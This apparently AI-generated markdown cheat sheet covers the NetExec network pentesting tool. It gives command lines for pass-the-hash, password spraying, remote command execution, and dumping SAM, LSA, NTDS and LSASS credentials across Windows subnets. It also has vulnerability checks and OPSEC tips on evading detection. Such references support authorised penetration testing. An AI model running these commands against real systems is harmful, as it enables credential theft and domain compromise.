# NetExec

**Tags:** `#netexec` `#crackmapexec` `#smb` `#winrm` `#ldap` `#mssql` `#activedirectory` `#postexploitation` `#enumeration` `#lateral`

The successor to CrackMapExec — Swiss army knife for network pentesting. Tests authentication across protocols (SMB, WinRM, LDAP, MSSQL, SSH, RDP, FTP), executes commands, dumps credentials, and runs post-exploitation modules across entire subnets. The primary tool for credential validation, PTH, and post-exploitation at scale in AD environments.

**Source:** https://github.com/Pennyw0rth/NetExec
**Install:** `sudo apt install netexec` or `pipx install netexec`

```bash
# Validate creds against subnet
netexec smb 192.168.1.0/24 -u Administrator -p Password

# PTH
netexec smb 192.168.1.0/24 -u Administrator -H :NTLMhash
```

> [!note] **NetExec vs CrackMapExec** — NetExec is the actively maintained fork of CrackMapExec. Commands are nearly identical — swap `crackmapexec` for `netexec`. CME still works but is no longer maintained. Use `nxc` as the shorthand alias.

---

## SMB — Authentication & Enumeration

```bash
# Null session enum
netexec smb 192.168.1.10 -u '' -p ''
netexec smb 192.168.1.0/24 -u '' -p '' --shares

# Guest session
netexec smb 192.168.1.10 -u 'guest' -p ''

# Validate credentials
netexec smb 192.168.1.10 -u Administrator -p Password
netexec smb 192.168.1.0/24 -u Administrator -p Password

# Pass the Hash
netexec smb 192.168.1.10 -u Administrator -H :NTLMhash
netexec smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:NTLMhash

# Local auth (not domain)
netexec smb 192.168.1.10 -u Administrator -p Password --local-auth

# Kerberos auth
KRB5CCNAME=ticket.ccache netexec smb dc01.domain.local -k

# List shares
netexec smb 192.168.1.10 -u user -p Password --shares

# Enumerate users (RID brute)
netexec smb 192.168.1.10 -u user -p Password --users
netexec smb 192.168.1.10 -u '' -p '' --rid-brute

# Enumerate groups
netexec smb 192.168.1.10 -u user -p Password --groups

# Enumerate logged-on users
netexec smb 192.168.1.10 -u user -p Password --loggedon-users

# Enumerate sessions
netexec smb 192.168.1.10 -u user -p Password --sessions

# Enumerate disks
netexec smb 192.168.1.10 -u user -p Password --disks

# Check SMB signing
netexec smb 192.168.1.0/24 --gen-relay-list no_signing.txt
```

---

## SMB — Command Execution

```bash
# Execute command (-x = cmd, -X = PowerShell)
netexec smb 192.168.1.10 -u Administrator -p Password -x "whoami"
netexec smb 192.168.1.10 -u Administrator -p Password -X "Get-Process"

# Execute across subnet
netexec smb 192.168.1.0/24 -u Administrator -p Password -x "whoami" --no-bruteforce

# PTH command exec
netexec smb 192.168.1.10 -u Administrator -H :NTLMhash -x "whoami"

# Use specific execution method
netexec smb 192.168.1.10 -u Administrator -p Password -x "whoami" --exec-method smbexec
netexec smb 192.168.1.10 -u Administrator -p Password -x "whoami" --exec-method wmiexec
netexec smb 192.168.1.10 -u Administrator -p Password -x "whoami" --exec-method atexec
```

---

## SMB — Credential Dumping

```bash
# SAM dump
netexec smb 192.168.1.10 -u Administrator -p Password --sam

# LSA secrets
netexec smb 192.168.1.10 -u Administrator -p Password --lsa

# NTDS (DC only — all domain hashes)
netexec smb 192.168.1.10 -u Administrator -p Password --ntds

# LSASS dump (lsassy module)
netexec smb 192.168.1.10 -u Administrator -p Password -M lsassy

# DPAPI
netexec smb 192.168.1.10 -u Administrator -p Password -M dpapi

# Dump all (SAM + LSA)
netexec smb 192.168.1.0/24 -u Administrator -p Password --sam --lsa --local-auth
```

---

## SMB — Modules

```bash
# List available modules
netexec smb -L

# GPP passwords (SYSVOL)
netexec smb 192.168.1.10 -u user -p Password -M gpp_password
netexec smb 192.168.1.10 -u user -p Password -M gpp_autologin

# Spider shares (search for interesting files)
netexec smb 192.168.1.10 -u user -p Password -M spider_plus
netexec smb 192.168.1.10 -u user -p Password -M spider_plus -o READ_ONLY=false

# Check for MS17-010 (EternalBlue)
netexec smb 192.168.1.0/24 -M ms17-010

# PrintNightmare
netexec smb 192.168.1.10 -u user -p Password -M printnightmare

# Zerologon check
netexec smb 192.168.1.10 -M zerologon

# LAPS passwords
netexec smb 192.168.1.10 -u user -p Password -M laps

# WebDAV check
netexec smb 192.168.1.0/24 -M webdav
```

---

## WinRM

```bash
# Test WinRM access
netexec winrm 192.168.1.10 -u Administrator -p Password

# PTH
netexec winrm 192.168.1.10 -u Administrator -H :NTLMhash

# Execute command
netexec winrm 192.168.1.10 -u Administrator -p Password -x "whoami"

# Subnet spray
netexec winrm 192.168.1.0/24 -u Administrator -p Password
```

---

## LDAP

```bash
# Validate domain creds via LDAP
netexec ldap 192.168.1.1 -u user -p Password -d DOMAIN

# Enumerate users
netexec ldap 192.168.1.1 -u user -p Password --users

# Kerberoastable users
netexec ldap 192.168.1.1 -u user -p Password --kerberoasting kerberoast.txt

# ASREPRoastable users
netexec ldap 192.168.1.1 -u user -p Password --asreproast asrep.txt

# Password not required
netexec ldap 192.168.1.1 -u user -p Password --password-not-required

# Admin count (privileged accounts)
netexec ldap 192.168.1.1 -u user -p Password --admin-count

# Trusted for delegation
netexec ldap 192.168.1.1 -u user -p Password --trusted-for-delegation

# Get MachineAccountQuota
netexec ldap 192.168.1.1 -u user -p Password -M maq
```

---

## MSSQL

```bash
# Test auth
netexec mssql 192.168.1.10 -u sa -p Password

# Windows auth
netexec mssql 192.168.1.10 -u Administrator -p Password -d DOMAIN --windows-auth

# Execute OS command via xp_cmdshell
netexec mssql 192.168.1.10 -u sa -p Password -x "whoami"

# Query
netexec mssql 192.168.1.10 -u sa -p Password -q "SELECT @@version"
```

---

## SSH / FTP / RDP

```bash
# SSH
netexec ssh 192.168.1.0/24 -u root -p Password
netexec ssh 192.168.1.0/24 -u root -p Password -x "id"

# FTP
netexec ftp 192.168.1.0/24 -u anonymous -p anonymous

# RDP — check access (no execution)
netexec rdp 192.168.1.0/24 -u Administrator -p Password
```

---

## Password Spraying

```bash
# Spray single password against user list
netexec smb 192.168.1.10 -u users.txt -p 'Spring2024!' --continue-on-success

# Spray password list (lockout risk — one at a time)
netexec smb 192.168.1.10 -u Administrator -p passwords.txt

# Subnet spray
netexec smb 192.168.1.0/24 -u users.txt -p 'Password1' --continue-on-success

# No bruteforce (try each user:pass combo once, not all passwords per user)
netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

---

## Output & Filtering

```bash
# Only show successful auths (Pwn3d! or [+])
netexec smb 192.168.1.0/24 -u Administrator -p Password | grep -i "pwn3d\|\[+\]"

# Save output
netexec smb 192.168.1.0/24 -u Administrator -p Password --log output.txt

# Results stored in ~/.nxc/logs/ and ~/.nxc/workspaces/
```

---

## OPSEC Notes

- Each SMB auth generates Event ID **4624** (logon) and **4625** (failed logon) on targets
- `--exec-method wmiexec` is noisier than `smbexec` — leaves fewer artifacts than psexec (no service install)
- `--ntds` triggers DCSync (Event ID **4662**) — highly monitored on DCs
- `spider_plus` module generates many file access events across shares — use targeted share access instead when OPSEC matters

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
